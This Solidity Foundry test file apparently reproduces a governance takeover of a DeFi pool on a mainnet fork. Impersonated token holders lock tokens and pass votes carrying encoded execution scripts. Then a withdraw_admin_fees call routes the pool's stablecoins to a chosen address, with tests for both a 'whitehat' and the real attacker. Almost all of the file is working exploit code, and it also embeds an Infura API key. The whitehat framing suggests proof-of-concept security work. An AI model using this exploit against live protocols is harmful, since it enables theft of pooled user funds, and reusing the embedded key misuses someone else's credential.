// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IYPool {
  function withdraw_admin_fees() external;
}


contract GovAttackTest is Test {
    IVotingContract voting = IVotingContract(0xDFF7beb0cBf54D6553E4702Ae0FfA60718822478);
    IVote_SWRC veSWRV = IVote_SWRC(0xe5e7DdADD563018b0E692C1524b60b754FBD7f02);
    IERC20 SWRC =  IERC20(0xB8BAa0e4287890a5F79863aB62b7F175ceCbD433);
    IYPool iYPool = IYPool(0x329239599afB305DA0A2eC69c58F8a6697F9F88d);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 TUSD = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    address whitehat = 0x93948ca22517421424868d021A5e987036f38a4E;
    address attacker = 0xcDEDb901181b4B90181424Ff581b627805186Ca7;

    function setUp() public {
    }

    function testGovAttack() public {
        // one block before the attack
        vm.createSelectFork('https://mainnet.infura.io/v3/e87fa958e0744923b862ee55bf1c8100');
        
        // Attacker buy 1M from OKX
        vm.startPrank(0x6cC5F688a315f3dC28A7781717a9A798a59fDA7b);
        SWRC.transfer(whitehat, 800_000 ether);
        vm.stopPrank();

        // Use my own address
        vm.startPrank(whitehat);
        SWRC.approve(address(veSWRV), type(uint256).max);
        uint256 unlockTime = 1805082900;
        veSWRV.create_lock(800_000 ether, unlockTime);

        vm.roll(block.number + 1);

        // vote id 5
        bytes memory execute_script_5 = hex'00000001cce356a37930e075921b486c746ba8ed6ebcf172000000e4b61d27f60000000000000000000000002638d2680ab4914126ee05b9c5ee95bac311a95e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000443ea1c6f4000000000000000000000000329239599afb305da0a2ec69c58f8a6697f9f88d00000000000000000000000093948ca22517421424868d021A5e987036f38a4E00000000000000000000000000000000000000000000000000000000';
        // vote id 6
        bytes memory execute_script_6 = hex'00000001cce356a37930e075921b486c746ba8ed6ebcf172000000c4b61d27f60000000000000000000000002638d2680ab4914126ee05b9c5ee95bac311a95e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000245f608d1e000000000000000000000000329239599afb305da0a2ec69c58f8a6697f9f88d00000000000000000000000000000000000000000000000000000000';
        string memory metadata = "";
        
        (uint256 voteID1) = voting.newVote(execute_script_5, metadata, false, false);
        vm.warp(block.timestamp + 43200);
        (uint256 voteID2) = voting.newVote(execute_script_6, metadata, false, false);

        voting.vote(voteID1, true, false);
        vm.warp(block.timestamp + 43200);
        voting.vote(voteID2, true, false);
        
        vm.roll(block.number+1);
        vm.warp(block.timestamp + 704800);
        voting.executeVote(voteID1);
        vm.warp(block.timestamp + 704800);
        voting.executeVote(voteID2);
        
        // WIthdraw admin fee
        iYPool.withdraw_admin_fees();
        vm.stopPrank();

        console.log("DAI: ", DAI.balanceOf(address(whitehat))/(10**18));
        console.log("USDC: ", USDC.balanceOf(address(whitehat))/(10**6));
        console.log("TUSD: ", TUSD.balanceOf(address(whitehat))/(10**18));
        console.log("USDT: ", USDT.balanceOf(address(whitehat))/(10**6));
    }

    function testSimulateAttackerBuyTokens() public {
        // After the attacker has created votes
        vm.createSelectFork('https://mainnet.infura.io/v3/e87fa958e0744923b862ee55bf1c8100');


        // Attacker's tx
        vm.startPrank(attacker);
        // Attacker start voting
        voting.vote(5, true, false);
        vm.warp(block.timestamp + 43200);
        voting.vote(6, true, false);
        
        vm.roll(block.number+1);
        vm.warp(1678988231 + 704800);
        voting.executeVote(5);
        vm.warp(block.timestamp + 704800);
        voting.executeVote(6);
        vm.stopPrank();

        vm.prank(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87);
        // WIthdraw admin fee
        iYPool.withdraw_admin_fees();
        vm.stopPrank();

        console.log("DAI: ", DAI.balanceOf(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87)/(10**18));
        console.log("USDC: ", USDC.balanceOf(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87)/(10**6));
        console.log("TUSD: ", TUSD.balanceOf(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87)/(10**18));
        console.log("USDT: ", USDT.balanceOf(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87)/(10**6));

    }

    function testSimulateAttacker() public {
        // After the attacker has created votes
        vm.createSelectFork('https://mainnet.infura.io/v3/e87fa958e0744923b862ee55bf1c8100');
        
        // Attacker buy 1M from OKX
        vm.startPrank(0x6cC5F688a315f3dC28A7781717a9A798a59fDA7b);
        SWRC.transfer(whitehat, 560_000 ether);
        vm.stopPrank();

        // Use my own address
        vm.startPrank(attacker);
        //SWRC.approve(address(veSWRV), type(uint256).max);
        uint256 unlockTime = 1805082900;
        veSWRV.create_lock(560_000 ether, unlockTime);

        // Attacker's tx
        vm.startPrank(attacker);
        // Attacker start voting
        voting.vote(5, true, false);
        vm.warp(block.timestamp + 43200);
        voting.vote(6, true, false);
        
        vm.roll(block.number+1);
        vm.warp(1678988231 + 704800);
        voting.executeVote(5);
        vm.warp(block.timestamp + 704800);
        voting.executeVote(6);
        vm.stopPrank();

        vm.prank(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87);
        // WIthdraw admin fee
        iYPool.withdraw_admin_fees();
        vm.stopPrank();

        console.log("DAI: ", DAI.balanceOf(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87)/(10**18));
        console.log("USDC: ", USDC.balanceOf(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87)/(10**6));
        console.log("TUSD: ", TUSD.balanceOf(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87)/(10**18));
        console.log("USDT: ", USDT.balanceOf(0x2E322c0430C8C2aD5179660Bb6298e3FBAE03f87)/(10**6));

    }


}

interface IERC20 {
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);

  function name() external view returns (string memory);

  function symbol() external view returns (string memory);

  function decimals() external view returns (uint8);

  function totalSupply() external view returns (uint256);

  function balanceOf(address owner) external view returns (uint256);

  function allowance(address owner, address spender)
  external
  view
  returns (uint256);

  function approve(address spender, uint256 value) external returns (bool);

  function transfer(address to, uint256 value) external returns (bool);

  function transferFrom(
    address from,
    address to,
    uint256 value
  ) external returns (bool);
  function withdraw(uint256 wad) external;
  function deposit(uint256 wad) external returns (bool);
  function owner() external view virtual returns (address);
}

interface IVotingContract {
    function vote(uint256 _voteId, bool _supports, bool _executesIfDecided) external;
    function newVote(bytes memory _executionScript, string memory _metadata, bool _castVote, bool _executesIfDecided) external returns(uint256);
    function executeVote(uint256 _voteId) external;
}
interface IVote_SWRC {
    function create_lock(uint256 _value, uint256 _unlock_time) external;
    function transfer(address to, uint256 value) external returns (bool);
}
